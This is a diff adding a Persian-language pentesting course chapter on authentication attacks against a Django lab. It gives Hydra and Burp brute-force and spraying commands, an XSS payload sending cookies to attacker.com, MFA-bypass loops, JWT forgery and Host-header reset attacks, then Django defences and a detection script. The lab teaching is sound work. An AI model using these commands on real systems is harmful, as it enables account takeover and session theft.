+                <div class="section-part" id="part-06">
+                    <h3>۶. آموزش گام‌به‌گام حملات</h3>
+
+                    <p>در این بخش، ۷ حمله اصلی را با ابزار، دستور و تکنیک یاد می‌گیریم.</p>
+
+                    <!-- ابزار ۱: Hydra -->
+                    <div class="tool-card">
+                        <h6>🛠 حمله ۱: Brute Force با Hydra</h6>
+                        <p class="use-case">کاربرد: سریع‌ترین ابزار CLI برای حمله به فرم‌های لاگین</p>
+
+                        <h5>۱) ساختار پایه Hydra:</h5>
+<pre class="code-box"># ساختار کلی:
+hydra -l USERNAME -P WORDLIST [-s PORT] TARGET PROTOCOL [OPTIONS]
+
+# حمله به SSH
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.20
+
+# حمله به FTP
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.20
+
+# حمله به فرم لاگین HTTP POST
+hydra -l admin -P rockyou.txt 192.168.56.20 \
+    http-post-form &quot;/login/:username=^USER^&amp;password=^PASS^:F=Invalid&quot;
+
+# حمله با نام کاربری از یک لیست
+hydra -L users.txt -P rockyou.txt ssh://192.168.56.20
+</pre>
+
+                        <h5>۲) حمله به فرم Django Admin:</h5>
+<pre class="code-box"># مرحله ۱: تحلیل فرم در Burp — endpoint و پارامترها
+# مثال: POST /admin/login/
+# پارامترها: username, password, csrfmiddlewaretoken
+
+# مرحله ۲: اجرای Hydra با CSRF Token
+# نکته: Django CSRF Token مانع Hydra می‌شود ولی می‌توان با پیکربندی دور زد
+
+# راه ساده: از Django Admin بدون CSRF استفاده کنید (فقط در lab)
+# یا از Burp Intruder که Cookie و CSRF Token را مدیریت می‌کند
+
+# مثال حمله به صفحه لاگین ساده (بدون CSRF):
+hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \
+    192.168.56.20 \
+    http-post-form &quot;/login/:username=^USER^&amp;password=^PASS^:F=Invalid credentials&quot; \
+    -V -t 10
+</pre>
+
+                        <h5>۳) گزینه‌های مفید Hydra:</h5>
+<pre class="code-box">-l USER    # یک نام کاربری مشخص
+-L FILE    # لیست نام‌های کاربری
+-p PASS    # یک رمز مشخص
+-P FILE    # لیست رمزها
+-t TASKS   # تعداد رشته موازی (پیش‌فرض 16)
+-V         # نمایش هر تلاش (verbose)
+-f         # توقف در اولین رمز صحیح (fast)
+-o FILE    # ذخیره نتایج
+-s PORT    # پورت مشخص
+-e nsr     # try null password / same as login / reverse
+-I         # نادیده گرفتن خطای درخواست قبل
+</pre>
+
+                        <div class="callout co-tip">
+                            <strong>💡 نکته طلایی:</strong>
+                            برای Brute Force حرفه‌ای، ابتدا <strong>Password Spraying</strong> کنید (۱۰ رمز پرتکرار روی ۱۰۰ کاربر).
+                            چون Lockout معمولاً روی «نام کاربری» است نه IP، Spraying شانس موفقیت بیشتری دارد.
+                        </div>
+                    </div>
+
+                    <!-- ابزار ۲: Burp Intruder -->
+                    <div class="tool-card">
+                        <h6>🛠 حمله ۲: Burp Suite Intruder (دقیق‌تر)</h6>
+                        <p class="use-case">کاربرد: حمله به فرم‌های پیچیده با CSRF Token، کوکی‌های پویا، پارامترهای JSON</p>
+
+                        <h5>۱) آماده‌سازی در Burp:</h5>
+<ol>
+    <li>در Burp، به تب <strong>Proxy → HTTP History</strong> بروید.</li>
+    <li>درخواست POST به <code>/login/</code> را پیدا و راست‌کلیک → <strong>Send to Intruder</strong>.</li>
+    <li>در تب <strong>Intruder → Positions</strong>، روی <strong>Clear §</strong> کلیک کنید.</li>
+    <li>روی <code>username</code> و <code>password</code> کلیک کنید و <strong>Add §</strong> بزنید.</li>
+</ol>
+
+<pre class="code-box"># نمونه درخواست با placeholder
+POST /admin/login/ HTTP/1.1
+Host: 192.168.56.20:8000
+Content-Type: application/x-www-form-urlencoded
+Cookie: csrftoken=xxxxx
+Content-Length: 75
+
+csrfmiddlewaretoken=xxxxx&amp;username=§admin§&amp;password=§password§&amp;next=/admin/
+</pre>
+
+                        <h5>۲) پیکربندی Payload:</h5>
+<ol>
+    <li>در تب <strong>Payloads</strong>، Payload Set 1 (نام کاربری):
+        <ul>
+            <li>Payload type: <strong>Simple list</strong></li>
+            <li>مقادیر: <code>admin</code>, <code>root</code>, <code>test</code>, <code>user</code></li>
+        </ul>
+    </li>
+    <li>Payload Set 2 (رمز):
+        <ul>
+            <li>Payload type: <strong>Runtime file</strong></li>
+            <li>Load wordlist: <code>/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt</code></li>
+        </ul>
+    </li>
+    <li>Attack type: <strong>Cluster bomb</strong> (همه ترکیب‌ها)</li>
+</ol>
+
+                        <h5>۳) تحلیل نتایج (Grep Match):</h5>
+<pre class="code-box"># در تب Options → Grep - Match:
+# کلمه‌ای که نشان می‌دهد لاگین موفق شد را اضافه کنید
+# مثلاً: &quot;Welcome&quot; یا &quot;Dashboard&quot; یا Status 302
+
+# یا در Grep - Extract:
+# Response Length را استخراج کنید
+# پاسخ‌های طولانی‌تر از حالت معمول = احتمالاً موفق
+</pre>
+
+                        <div class="callout co-tip">
+                            <strong>💡 چرا Burp Intruder بهتر از Hydra است؟</strong>
+                            <ul style="margin: 6px 0 0 0;">
+                                <li>مدیریت خودکار CSRF Token با <strong>Macros</strong> و <strong>Session Handling Rules</strong></li>
+                                <li>فیلتر کردن پاسخ‌ها بر اساس Status/Length/Word</li>
+                                <li>ثبت تاریخ و ساعت هر تلاش (برای گزارش حرفه‌ای)</li>
+                                <li>ذخیره تمام پاسخ‌ها برای تحلیل offline</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <!-- ابزار ۳: Session Hijacking -->
+                    <div class="tool-card">
+                        <h6>🛠 حمله ۳: Session Hijacking و Session Fixation</h6>
+                        <p class="use-case">کاربرد: دزدیدن یا تحمیل Session ID برای تصاحب نشست قربانی</p>
+
+                        <h5>۱) تشخیص کوکی نشست ضعیف:</h5>
+<pre class="code-box"># در Burp، پاسخ لاگین را بررسی کنید
+# یک کوکی نمونه (خطرناک):
+Set-Cookie: sessionid=12345; path=/
+
+# کوکی امن (باید این‌طور باشد):
+Set-Cookie: sessionid=a3f9d8b2e1c4...; HttpOnly; Secure; SameSite=Strict; path=/
+</pre>
+
+                        <h5>۲) حمله Session Fixation:</h5>
+<div class="phase-diagram">
+<pre>1. مهاجم به سایت می‌رود، Session ID می‌گیرد: SID=A
+
+2. مهاجم لینک آلوده می‌سازد:
+   http://target.com/login?SID=A
+
+3. قربانی روی لینک کلیک می‌کند و وارد سایت می‌شود
+
+4. سرور، Session ID قربانی را تغییر نمی‌دهد (باگ!)
+   → همان SID=A می‌ماند
+
+5. مهاجم با SID=A از Session قربانی استفاده می‌کند
+</pre>
+</div>
+
+                        <h5>۳) حمله Session Hijacking از طریق XSS:</h5>
+<pre class="code-box"># اگر HttpOnly روی کوکی نباشد، از XSS می‌توان کوکی را دزدید:
+&lt;script&gt;
+new Image().src = &#39;http://attacker.com/steal?c=&#39; + document.cookie;
+&lt;/script&gt;
+
+# روی سرور مهاجم (Kali) با netcat گوش کنید:
+nc -lvnp 80
+</pre>
+
+                        <h5>۴) حمله از طریق Sniffing (شبکه غیررمز):</h5>
+<pre class="code-box"># اگر سایت HTTP باشد (نه HTTPS)، کوکی به‌صورت plaintext فرستاده می‌شود
+sudo tcpdump -i eth0 -A &#39;tcp port 80 and (tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x47455420)&#39;
+
+# یا با Wireshark:
+# Filter: http.cookie
+</pre>
+
+                        <div class="callout co-warn">
+                            <strong>⚠️ نکته:</strong>
+                            Session Hijacking از طریق XSS فقط وقتی کار می‌کند که کوکی <strong>HttpOnly نباشد</strong>.
+                            Django به‌طور پیش‌فرض HttpOnly را فعال می‌کند، پس این حمله روی Django lab ما کار <strong>نمی‌کند</strong>.
+                            ولی اگر یک توسعه‌دهنده اشتباهاً آن را غیرفعال کند، حمله موفق می‌شود.
+                        </div>
+                    </div>
+
+                    <!-- ابزار ۴: MFA Bypass -->
+                    <div class="tool-card">
+                        <h6>🛠 حمله ۴: MFA Bypass (۶ تکنیک)</h6>
+                        <p class="use-case">کاربرد: دور زدن احراز هویت دو مرحله‌ای</p>
+
+                        <h5>تکنیک ۱: Response Manipulation</h5>
+<pre class="code-box"># سرور می‌گوید: {&quot;success&quot;: false, &quot;mfa_required&quot;: true}
+# آن را در Burp تغییر دهید:
+{&quot;success&quot;: true, &quot;mfa_required&quot;: false}
+
+# اگر سرور پاسخ را باور کند، MFA دور می‌خورد
+</pre>
+
+                        <h5>تکنیک ۲: Direct Endpoint Access</h5>
+<pre class="code-box"># مرحله ۱: با نام کاربری و رمز صحیح لاگین کنید
+# مرحله ۲: سرور شما را به /mfa/ هدایت می‌کند
+# مرحله ۳: در Burp، مستقیم به /dashboard/ بروید
+# اگر سرور چک نکند MFA انجام شده، موفق!
+
+curl -X GET http://192.168.56.20:8000/dashboard/ \
+     -H &quot;Cookie: session=abc...&quot;
+</pre>
+
+                        <h5>تکنیک ۳: MFA Code Brute Force</h5>
+<pre class="code-box"># اگر کد 6 رقمی است و Rate Limit ندارد، 1 میلیون ترکیب
+# با Burp Intruder:
+# Payload type: Numbers
+# From: 000000
+# To: 999999
+# Step: 1
+# Min/Max integer digits: 6
+
+# یا با hydra:
+hydra -l admin -P &lt;(seq -f &quot;%06g&quot; 0 999999) 192.168.56.20 \
+    http-post-form &quot;/verify-mfa/:code=^PASS^:F=Invalid&quot;
+</pre>
+
+                        <h5>تکنیک ۴: MFA Fatigue (Push Notification Bombing)</h5>
+<pre class="code-box"># اگر MFA با Push Notification است:
+# با login مکرر، ده‌ها درخواست تأیید برای قربانی بفرست
+# قربانی از خستگی روی Accept می‌زند
+
+# با ساده‌ترین اسکریپت:
+for i in {1..50}; do
+    curl -X POST http://target.com/login \
+         -d &quot;username=victim&amp;password=known_password&quot; &amp;
+done
+wait
+</pre>
+
+                        <h5>تکنیک ۵: Recovery Code Abuse</h5>
+<pre class="code-box"># اگر کاربر Recovery Code دارد (مثلاً 8 کاراکتر):
+# 1. Recovery Codes کوتاه هستند
+# 2. Rate Limit روی آن‌ها کمتر است
+# 3. ورود با Recovery Code معمولاً لاگ نمی‌شود
+
+# حمله را از لاگین عادی به بخش Recovery Code منتقل کنید
+</pre>
+
+                        <h5>تکنیک ۶: Race Condition روی MFA</h5>
+<pre class="code-box"># 100 درخواست تأیید MFA را همزمان بفرستید
+# اگر سرور بدون بررسی race condition پردازش کند، یکی موفق می‌شود
+
+# با Burp Repeater → Send Group in Parallel
+# یا با اسکریپت:
+for i in {1..100}; do
+    curl -X POST http://target.com/verify-mfa/ \
+         -d &quot;code=123456&quot; &amp;
+done
+wait
+</pre>
+                    </div>
+
+                    <!-- ابزار ۵: JWT Attacks -->
+                    <div class="tool-card">
+                        <h6>🛠 حمله ۵: JWT Attacks (None Algorithm + Key Confusion)</h6>
+                        <p class="use-case">کاربرد: دستکاری توکن احراز هویت مبتنی بر JSON Web Token</p>
+
+                        <h5>۱) ساختار JWT:</h5>
+<pre class="code-box"># JWT از سه بخش تشکیل شده که با نقطه جدا می‌شوند:
+# HEADER.PAYLOAD.SIGNATURE
+
+# مثال:
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE3MDB9.abc123...
+
+# Header (Base64-decoded):
+{&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;}
+
+# Payload (Base64-decoded):
+{&quot;user&quot;: &quot;admin&quot;, &quot;exp&quot;: 1700000000}
+</pre>
+
+                        <h5>۲) حمله None Algorithm:</h5>
+<pre class="code-box"># اگر سرور الگوریتم none را قبول کند:
+# ۱) Header را به none تغییر دهید:
+{&quot;alg&quot;: &quot;none&quot;, &quot;typ&quot;: &quot;JWT&quot;}
+
+# ۲) Payload را به user=admin تغییر دهید
+{&quot;user&quot;: &quot;admin&quot;, &quot;exp&quot;: 1700000000}
+
+# ۳) Signature را حذف کنید (نقطه آخر بماند):
+eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+</pre>
+
+                        <h5>۳) حمله با jwt_tool (خودکار):</h5>
+<pre class="code-box"># نصب:
+git clone https://github.com/ticarpi/jwt_tool
+cd jwt_tool
+pip3 install -r requirements.txt
+
+# حالت تعاملی:
+python3 jwt_tool.py eyJhbGci... \
+
+# حمله none:
+python3 jwt_tool.py &lt;TOKEN&gt; -X a
+
+# حمله با wordlist (کرک کلید):
+python3 jwt_tool.py &lt;TOKEN&gt; -C -d /usr/share/wordlists/rockyou.txt
+
+# حمله Key Confusion (RS256 به HS256):
+python3 jwt_tool.py &lt;TOKEN&gt; -X k -pk public.pem
+</pre>
+
+                        <h5>۴) حمله Key Confusion (RS256 → HS256):</h5>
+<pre class="code-box"># سناریو: سرور از RS256 استفاده می‌کند (کلید عمومی برای verify)
+# ولی اگر alg را به HS256 تغییر دهید، سرور ممکن است
+# با کلید عمومی، HMAC بسازد (اشتباه رایج)
+
+# ۱) Header را تغییر دهید:
+{&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;}
+
+# ۲) Payload را به user=admin تغییر دهید
+
+# ۳) HMAC با کلید عمومی (public.pem) بسازید:
+# با jwt_tool -X k -pk public.pem
+
+# ۴) ارسال توکن جدید
+# اگر سرور هم پذیرفت، admin هستید!
+</pre>
+
+                        <div class="callout co-tip">
+                            <strong>💡 منبع یادگیری عملی:</strong>
+                            PortSwigger Web Security Academy، مسیر <strong>JWT Attacks</strong> —
+                            ۷ lab تعاملی رایگان برای تمرین همه این حملات.
+                        </div>
+                    </div>
+
+                    <!-- ابزار ۶: Password Reset -->
+                    <div class="tool-card">
+                        <h6>🛠 حمله ۶: Password Reset Flaws</h6>
+                        <p class="use-case">کاربرد: سوءاستفاده از فرآیند بازنشانی رمز</p>
+
+                        <h5>۱) حمله به Reset Token ضعیف:</h5>
+<pre class="code-box"># اگر Reset Token تولیدشده فقط 6 رقم یا کوتاه است:
+# ۱) درخواست Reset برای victim@example.com بفرست
+# ۲) Token 6 رقمی برمی‌گردد: &quot;Reset code: 123456&quot;
+
+# ۳) با Burp Intruder روی ۶ رقم Brute Force:
+# Payload type: Numbers 0-999999
+# اگر Rate Limit ندارد، در چند دقیقه حل می‌شود
+</pre>
+
+                        <h5>۲) حمله Host Header Injection:</h5>
+<pre class="code-box"># اگر Reset Link به‌جای دامنه اصلی از Host header استفاده کند:
+
+# درخواست اصلی:
+POST /password-reset/ HTTP/1.1
+Host: attacker.com
+Content-Type: application/json
+
+{&quot;email&quot;: &quot;victim@example.com&quot;}
+
+# ایمیل قربانی شامل لینکی می‌شود:
+# http://attacker.com/reset?token=abc123
+
+# قربانی روی لینک کلیک می‌کند → مهاجم Token را در لاگ می‌بیند!
+</pre>
+
+                        <h5>۳) حمله Race Condition روی Reset:</h5>
+<pre class="code-box"># اگر سرور Token را یک بار مصرف نمی‌کند، از آن چند بار استفاده کنید
+# یا اگر Reset در دو مرحله است، بین مراحل Race Condition ایجاد کنید
+
+# با Burp Repeater → Send Group in Parallel (Single Packet Attack)
+</pre>
+
+                        <h5>۴) حمله Email Change ترکیبی:</h5>
+<pre class="code-box"># اگر Reset با ایمیل انجام می‌شود:
+# ۱) وارد حساب خودتان شوید
+# ۲) درخواست تغییر ایمیل به victim@example.com بدهید
+# ۳) درخواست Reset رمز برای همان ایمیل
+# ۴) ممکن است لینک Reset به ایمیل شما بیاید ولی Token برای victim باشد
+# ۵) بازنشانی رمز قربانی!
+</pre>
+                    </div>
+
+                    <!-- ابزار ۷: Account Enumeration -->
+                    <div class="tool-card">
+                        <h6>🛠 حمله ۷: Account Enumeration</h6>
+                        <p class="use-case">کاربرد: کشف نام‌های کاربری معتبر قبل از Brute Force</p>
+
+                        <h5>۱) از پیام خطا:</h5>
+<pre class="code-box"># اگر سرور پیام‌های متفاوت می‌دهد:
+POST /login/ {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;wrong&quot;}
+→ &quot;رمز عبور اشتباه است&quot;     ← user exists
+POST /login/ {&quot;username&quot;: &quot;xyzabc&quot;, &quot;password&quot;: &quot;wrong&quot;}
+→ &quot;کاربر یافت نشد&quot;          ← user doesn&#39;t exist
+</pre>
+
+                        <h5>۲) از زمان پاسخ (Timing Attack):</h5>
+<pre class="code-box"># حتی اگر پیام یکسان باشد، زمان پاسخ لو می‌دهد:
+# - کاربر موجود: 200ms (چون هش رمز چک می‌شود)
+# - کاربر ناموجود: 50ms (چون سریع رد می‌شود)
+
+# با Burp Intruder + Response Time Filter
+</pre>
+
+                        <h5>۳) از رفتار Reset Password:</h5>
+<pre class="code-box"># اگر پیام Reset Password متفاوت باشد:
+# - کاربر موجود: &quot;ایمیل بازنشانی ارسال شد&quot;
+# - کاربر ناموجود: &quot;ایمیل یافت نشد&quot;
+
+# یا حتی بدون پیام: زمان پاسخ متفاوت باشد
+</pre>
+
+                        <h5>۴) ابزار خودکار:</h5>
+<pre class="code-box"># با ffuf و wordlist:
+ffuf -u http://192.168.56.20:8000/login/ \
+     -X POST -d &quot;username=FUZZ&amp;password=x&quot; \
+     -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
+     -mc all -fs 0
+</pre>
+                    </div>
+                </div>
+
+                <!-- بخش ۷ -->
+                <div class="section-part" id="part-07">
+                    <h3>۷. کارگاه عملی (اجرا در آزمایشگاه شما)</h3>
+
+                    <div class="workshop-box">
+                        <h5>🛠️ هدف کارگاه: زنجیره کامل حمله به Django Admin</h5>
+                        <p>در این کارگاه، از کشف تا دستیابی کامل به Django Admin را تمرین می‌کنیم.</p>
+                    </div>
+
+                    <h4><span class="step-number">۱</span> آماده‌سازی</h4>
+<pre class="code-box"># ۱) Snapshot جدید از هر VM بگیرید
+# نام: pre-auth-attacks
+
+# ۲) روی هدف، ادمین با رمز ضعیف بسازید
+# در Windows (روی Django lab):
+python manage.py createsuperuser
+# Username: admin
+# Password: password123  (عمداً ضعیف)
+
+# ۳) بررسی دسترسی:
+curl -I http://192.168.56.20:8000/admin/login/
+</pre>
+
+                    <h4><span class="step-number">۲</span> کشف ساختار لاگین</h4>
+<pre class="code-box"># ۱) با Burp، صفحه لاگین را باز کنید و درخواست POST را Capture کنید
+# ۲) ساختار درخواست:
+POST /admin/login/ HTTP/1.1
+Host: 192.168.56.20:8000
+Content-Type: application/x-www-form-urlencoded
+
+csrfmiddlewaretoken=xxx&amp;username=admin&amp;password=xxx&amp;next=/admin/
+</pre>
+
+                    <h4><span class="step-number">۳</span> Account Enumeration</h4>
+<pre class="code-box"># با Burp Intruder، نام کاربری‌های مختلف را تست کنید
+# Payload: Seclists Usernames shortlist
+
+# یا با curl:
+for user in admin root test user guest administrator; do
+    echo &quot;Testing $user...&quot;
+    curl -s -X POST http://192.168.56.20:8000/admin/login/ \
+         -d &quot;username=$user&amp;password=wrongpass&quot; \
+         -w &quot;Time: %{time_total}s\n&quot; -o /dev/null
+done
+
+# کاربرانی که زمان پاسخ طولانی‌تری دارند، احتمالاً معتبر هستند
+</pre>
+
+                    <h4><span class="step-number">۴</span> Brute Force با Hydra</h4>
+<pre class="code-box"># برای سادگی، از Django Admin بدون CSRF استفاده می‌کنیم
+# یا از یک endpoint لاگین ساده
+
+# ۱) یک اپ لاگین ساده در Django بسازید:
+# views.py
+def simple_login(request):
+    if request.method == &quot;POST&quot;:
+        username = request.POST.get(&quot;username&quot;)
+        password = request.POST.get(&quot;password&quot;)
+        user = authenticate(request, username=username, password=password)
+        if user:
+            login(request, user)
+            return HttpResponse(&quot;Welcome!&quot;)
+        return HttpResponse(&quot;Invalid credentials&quot;)
+    return render(request, &quot;login.html&quot;)
+
+# ۲) از این endpoint برای Hydra استفاده کنید:
+hydra -l admin \
+    -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \
+    192.168.56.20:8000 \
+    http-post-form &quot;/simple-login/:username=^USER^&amp;password=^PASS^:F=Invalid&quot; \
+    -V -f -t 4
+</pre>
+
+                    <h4><span class="step-number">۵</span> Brute Force با Burp Intruder (حرفه‌ای‌تر)</h4>
+<pre class="code-box"># ۱) درخواست لاگین را به Intruder بفرستید
+# ۲) Positions: username (admin) و password (§placeholder§)
+# ۳) Payloads: 
+#    - Set 1: Simple list [admin]
+#    - Set 2: Runtime file → top-1000.txt
+# ۴) Options → Grep - Match:
+#    - &quot;Welcome&quot; (اگر پیدا شد، لاگین موفق)
+# ۵) Start Attack
+# ۶) در ستون Grep، به دنبال ✓ بگردید
+</pre>
+
+                    <h4><span class="step-number">۶</span> Password Spraying (جایگزین هوشمندانه)</h4>
+<pre class="code-box"># اگر Lockout بعد از 5 تلاش فعال است:
+# به‌جای Brute Force، Password Spraying کنید
+
+# users.txt:
+# admin
+# root
+# test
+# user
+# guest
+# support
+# info
+
+# passwords.txt (فقط رمزهای فوق‌پرتکرار):
+# password
+# 123456
+# admin
+# admin123
+# 12345678
+# password123
+# qwerty
+
+# با Hydra:
+hydra -L users.txt -P passwords.txt 192.168.56.20:8000 \
+    http-post-form &quot;/simple-login/:username=^USER^&amp;password=^PASS^:F=Invalid&quot;
+</pre>
+
+                    <h4><span class="step-number">۷</span> تحلیل و مستندسازی</h4>
+<pre class="code-box"># ساخت auth-attack-report.md:
+
+# Auth Attack Report — Django Lab
+## تاریخ: 1405/XX/XX
+
+### 1. هدف
+- URL: http://192.168.56.20:8000/admin/login/
+- Username: admin (کشف‌شده با Enumeration)
+- Password: password123 (کشف‌شده با Brute Force)
+
+### 2. زمان Brute Force
+- Wordlist: top-1000.txt (1000 رمز)
+- نرخ درخواست: 4 req/s
+- زمان کل: ~4 دقیقه
+- تعداد تلاش تا موفقیت: ~ 500
+
+### 3. شواهد
+- Screenshot لاگین موفق
+- هدر Set-Cookie نشست
+- لاگ Burp Intruder
+
+### 4. Severity
+- CVSS: 9.8 (Critical)
+- Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+
+### 5. Remediation
+1. Rate Limiting: حداکثر 5 تلاش در دقیقه
+2. Account Lockout: 10 تلاش ناموفق → 30 دقیقه قفل
+3. استفاده از CAPTCHA بعد از 3 تلاش ناموفق
+4. فعال‌سازی 2FA برای همه adminها
+5. استفاده از رمزهای قوی (حداقل 12 کاراکتر)
+6. لاگ و Alert برای تلاش‌های ناموفق
+</pre>
+
+                    <div class="callout co-tip">
+                        <strong>💡 نکته حرفه‌ای:</strong>
+                        همیشه قبل از Brute Force، از Rate Limit و Lockout مطلع شوید. اگر Lockout فعال است، Password Spraying کنید.
+                        اگر Rate Limit فعال است، سرعت را کم کنید. اگر CAPTCHA هست، API endpointهای فراموش‌شده را چک کنید
+                        (مثل <code>/api/v1/login</code> که ممکن است CAPTCHA نداشته باشد).
+                    </div>
+                </div>
+
+                <!-- بخش ۸ -->
+                <div class="section-part" id="part-08">
+                    <h3>۸. تحلیل دفاعی و راهکارهای مقابله</h3>
+
+                    <p>حالا از دید مدافع — چطور جلوی حملات این فصل را بگیریم؟</p>
+
+                    <h5>🛡️ مدل دفاعی چندلایه:</h5>
+                    <div class="phase-diagram">
+<pre>┌───────────────────────────────────────────────────────┐
+│  لایه ۶: 2FA/MFA برای همه کاربران مهم                │
+├───────────────────────────────────────────────────────┤
+│  لایه ۵: Monitoring و Alert روی رفتار مشکوک           │
+├───────────────────────────────────────────────────────┤
+│  لایه ۴: CAPTCHA + Rate Limiting + Lockout            │
+├───────────────────────────────────────────────────────┤
+│  لایه ۳: Session Management امن (HttpOnly, Secure)   │
+├───────────────────────────────────────────────────────┤
+│  لایه ۲: JWT امن یا Session-based (بدون JWT ضعیف)    │
+├───────────────────────────────────────────────────────┤
+│  لایه ۱: Password Policy + bcrypt/Argon2             │
+└───────────────────────────────────────────────────────┘
+</pre>
+                    </div>
+
+                    <h5>🔐 چک‌لیست دفاعی — در برابر هر حمله:</h5>
+                    <table class="objectives-table">
+                        <thead>
+                            <tr><th>حمله</th><th>دفاع ۱</th><th>دفاع ۲</th><th>دفاع ۳</th></tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Brute Force</strong></td>
+                                <td>Rate Limiting (5/min)</td>
+                                <td>Account Lockout (10 attempts)</td>
+                                <td>CAPTCHA بعد از 3 تلاش</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Credential Stuffing</strong></td>
+                                <td>Check Against Breach DB</td>
+                                <td>Detection رفتاری (IP/Device)</td>
+                                <td>Mandatory 2FA</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Session Hijacking</strong></td>
+                                <td>HttpOnly + Secure + SameSite</td>
+                                <td>Session Rotation</td>
+                                <td>IP/User-Agent Binding</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Session Fixation</strong></td>
+                                <td>تولید Session جدید بعد از Login</td>
+                                <td>Invalidate Session قدیمی</td>
+                                <td>Session ID تصادفی (128 bit)</td>
+                            </tr>
+                            <tr>
+                                <td><strong>MFA Bypass</strong></td>
+                                <td>بررسی MFA در هر درخواست</td>
+                                <td>Rate Limit روی OTP</td>
+                                <td>یک‌بار مصرف بودن کد</td>
+                            </tr>
+                            <tr>
+                                <td><strong>JWT Attacks</strong></td>
+                                <td>Whitelist Algorithms</td>
+                                <td>Verify امضا با کلید درست</td>
+                                <td>KID Injection Defense</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Password Reset</strong></td>
+                                <td>Token تصادفی 256-bit</td>
+                                <td>یک‌بار مصرف + انقضای کوتاه</td>
+                                <td>Host Header Whitelist</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <h5>💻 پیاده‌سازی دفاعی در Django:</h5>
+
+                    <div class="creative-box">
+                        <h6>🔹 کد امن Django — Rate Limiting و Lockout</h6>
+<pre class="code-box"># نصب django-axes
+pip install django-axes
+
+# در settings.py
+INSTALLED_APPS += [&quot;axes&quot;]
+MIDDLEWARE = [
+    &quot;axes.middleware.AxesMiddleware&quot;,
+    # ...
+]
+AUTHENTICATION_BACKENDS = [
+    &quot;axes.backends.AxesStandaloneBackend&quot;,
+    &quot;django.contrib.auth.backends.ModelBackend&quot;,
+]
+
+# تنظیمات
+AXES_FAILURE_LIMIT = 5            # بعد از 5 تلاش ناموفق
+AXES_COOLOFF_TIME = 1             # 1 ساعت قفل
+AXES_LOCKOUT_PARAMETERS = [&quot;username&quot;, &quot;ip_address&quot;]  # قفل بر اساس هر دو
+AXES_RESET_ON_SUCCESS = True      # ریست بعد از لاگین موفق
+
+# حالا Django Admin به‌طور خودکار قفل می‌شود
+</pre>
+                    </div>
+
+                    <div class="creative-box">
+                        <h6>🔹 Rate Limiting سفارشی برای Login</h6>
+<pre class="code-box"># نصب django-ratelimit
+pip install django-ratelimit
+
+# در views.py
+from django_ratelimit.decorators import ratelimit
+
+@ratelimit(key=&#39;ip&#39;, rate=&#39;5/m&#39;, method=&#39;POST&#39;, block=True)
+def login_view(request):
+    # منطق لاگین
+    ...
+
+# یا با drf-throttle برای API:
+from rest_framework.throttling import AnonRateThrottle
+
+class LoginThrottle(AnonRateThrottle):
+    rate = &#39;5/min&#39;
+</pre>
+                    </div>
+
+                    <div class="creative-box">
+                        <h6>🔹 تنظیمات امن Session در Django</h6>
+<pre class="code-box"># settings.py
+SESSION_COOKIE_HTTPONLY = True       # مهم — از XSS جلوگیری می‌کند
+SESSION_COOKIE_SECURE = True         # فقط HTTPS
+SESSION_COOKIE_SAMESITE = &quot;Strict&quot;   # در برابر CSRF
+SESSION_COOKIE_AGE = 3600            # 1 ساعت
+SESSION_EXPIRE_AT_BROWSER_CLOSE = True  # بستن مرورگر = logout
+SESSION_ENGINE = &quot;django.contrib.sessions.backends.cached_db&quot;  # سریع‌تر
+
+# چرخش Session بعد از Login
+# در ویوی login:
+from django.contrib.auth import login
+login(request, user)
+request.session.cycle_key()          # Session Fixation defense
+</pre>
+                    </div>
+
+                    <div class="creative-box">
+                        <h6>🔹 پیاده‌سازی امن JWT در DRF</h6>
+<pre class="code-box"># نصب SimpleJWT
+pip install djangorestframework-simplejwt
+
+# settings.py
+from datetime import timedelta
+
+SIMPLE_JWT = {
+    &quot;ACCESS_TOKEN_LIFETIME&quot;: timedelta(minutes=15),      # کوتاه
+    &quot;REFRESH_TOKEN_LIFETIME&quot;: timedelta(days=7),
+    &quot;ROTATE_REFRESH_TOKENS&quot;: True,                       # چرخش Refresh
+    &quot;BLACKLIST_AFTER_ROTATION&quot;: True,                    # بلاک قدیمی
+    &quot;ALGORITHM&quot;: &quot;HS256&quot;,
+    &quot;SIGNING_KEY&quot;: settings.SECRET_KEY,
+    &quot;AUTH_HEADER_TYPES&quot;: (&quot;Bearer&quot;,),
+    &quot;USER_ID_FIELD&quot;: &quot;id&quot;,
+    &quot;USER_ID_CLAIM&quot;: &quot;user_id&quot;,
+}
+
+# نکته: JWT را نباید در localStorage مرورگر ذخیره کرد (XSS)
+# بهتر: HttpOnly Cookie برای Refresh، Memory برای Access
+</pre>
+                    </div>
+
+                    <div class="creative-box">
+                        <h6>🔹 تشخیص Brute Force با تحلیل لاگ</h6>
+<pre class="code-box"># اسکریپت تشخیص Brute Force در Nginx log:
+#!/bin/bash
+LOG=/var/log/nginx/access.log
+
+# ۱) IPهای با بیش از 50 درخواست به /login/
+echo &quot;=== IPهای مشکوک به Brute Force ===&quot;
+grep &quot;/login/&quot; $LOG | awk &#39;{print $1}&#39; | sort | uniq -c | sort -rn | head -10
+
+# ۲) نمایش 401های زیاد (لاگین ناموفق)
+echo &quot;&quot;
+echo &quot;=== بیشترین 401 در 1 ساعت ===&quot;
